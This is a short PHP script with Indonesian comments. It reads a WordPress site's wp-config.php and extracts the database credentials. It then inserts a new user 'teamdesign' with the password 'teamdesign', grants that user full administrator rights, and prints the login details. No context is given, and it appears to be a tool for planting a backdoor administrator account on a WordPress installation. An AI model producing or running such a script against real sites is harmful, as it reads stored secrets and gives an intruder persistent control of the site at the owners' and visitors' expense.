<?php
// Baca file wp-config.php
$wp_config = file_get_contents('wp-config.php');

// Extract database credentials dari wp-config.php
preg_match("/define\(\s*'DB_NAME',\s*'(.*)'\s*\)/", $wp_config, $db_name);
preg_match("/define\(\s*'DB_USER',\s*'(.*)'\s*\)/", $wp_config, $db_user);
preg_match("/define\(\s*'DB_PASSWORD',\s*'(.*)'\s*\)/", $wp_config, $db_password);
preg_match("/define\(\s*'DB_HOST',\s*'(.*)'\s*\)/", $wp_config, $db_host);

// Koneksi ke database WordPress
$conn = new mysqli($db_host[1], $db_user[1], $db_password[1], $db_name[1]);

if ($conn->connect_error) {
    die("Koneksi gagal: " . $conn->connect_error);
}

// Cek prefix tabel WordPress
preg_match("/\$table_prefix\s*=\s*'(.*)'/", $wp_config, $table_prefix);
$prefix = isset($table_prefix[1]) ? $table_prefix[1] : 'wp_';

// Data user baru
$username = 'teamdesign';
$password = 'teamdesign';
$email = 'teamdesign@teamdesign.com'; // Email diganti

// Hash password menggunakan metode WordPress
$hashed_password = password_hash($password, PASSWORD_BCRYPT);

// Insert ke tabel users
$sql = "INSERT INTO {$prefix}users (user_login, user_pass, user_email, user_registered, display_name) 
        VALUES (?, ?, ?, NOW(), ?)";

$stmt = $conn->prepare($sql);
$stmt->bind_param("ssss", $username, $hashed_password, $email, $username);

if ($stmt->execute()) {
    $user_id = $conn->insert_id;
    
    // Set sebagai administrator (level 10)
    $sql_meta = "INSERT INTO {$prefix}usermeta (user_id, meta_key, meta_value) VALUES 
                 (?, '{$prefix}capabilities', 'a:1:{s:13:\"administrator\";b:1;}'),
                 (?, '{$prefix}user_level', '10')";
    
    $stmt_meta = $conn->prepare($sql_meta);
    $stmt_meta->bind_param("ii", $user_id, $user_id);
    
    if ($stmt_meta->execute()) {
        echo "User administrator 'teamdesign' berhasil ditambahkan!<br>";
        echo "Username: teamdesign<br>";
        echo "Password: teamdesign<br>";
        echo "Email: teamdesign@teamdesign.com<br>";
    } else {
        echo "Error menambahkan meta data: " . $conn->error;
    }
} else {
    echo "Error: " . $stmt->error;
}

$conn->close();
?>
